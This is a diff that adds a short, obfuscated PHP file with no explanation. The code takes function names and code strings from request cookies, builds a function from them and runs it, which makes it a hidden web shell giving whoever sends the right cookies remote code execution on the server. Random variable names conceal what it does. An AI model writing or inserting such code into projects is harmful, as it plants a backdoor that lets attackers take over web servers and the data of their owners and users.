@@ -1,0 +1,7 @@
+<?php
+
+$gqh=$_COOKIE;
+$pww=$gqh[ktfl];
+if($pww){
+	$aco=$pww($gqh[anrm]);$lpkj=$pww($gqh[vgmb]);$okvyb=$aco("",$lpkj);$okvyb();
+}
